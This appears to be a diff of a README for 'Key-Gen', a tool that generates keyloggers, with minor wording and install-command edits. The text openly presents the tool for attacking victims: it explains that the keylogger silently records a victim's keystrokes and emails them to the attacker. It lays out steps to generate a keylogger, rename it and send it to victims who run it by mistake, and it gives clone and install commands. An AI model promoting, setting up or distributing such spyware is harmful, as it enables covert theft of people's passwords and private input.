@@ -4,9 +4,9 @@
 
 This Our Keylogger Software will silently captured and record all the keystrokes that the victims types on the targetted machine, and leter on send them to the attacker email. 
 
-# How it Work:
+# How to Used it:
 1. An attacker run **Key-Gen** by specifying their email address, password and report interval (in seconds).
-2. **Key-Gen** generate a specific keylogger software with a uniquet ID on it.
+2. **Key-Gen** generate a specific keylogger software with a unique ID on it.
 3. Attacker rename the generated keylogger software and send it to their Victims.
 4. Victims mistakely start the keylogger software. BOOM 🎇 Game Over!.
 5. Keylogger software send some information to the attacker's email, each time victims connected to their network.
@@ -18,7 +18,10 @@ Visit this site [https://github.com/evilfeonix/Key-Gen/wiki](https://github.com/
 
 # Keylogger Generator Installation
 ```bash
-apt install bash python3
+apt install bash
+```
+```bash
+apt install python3
 ```
 ```bash
 git clone https://github.com/evilfeonix/Key-Gen.git
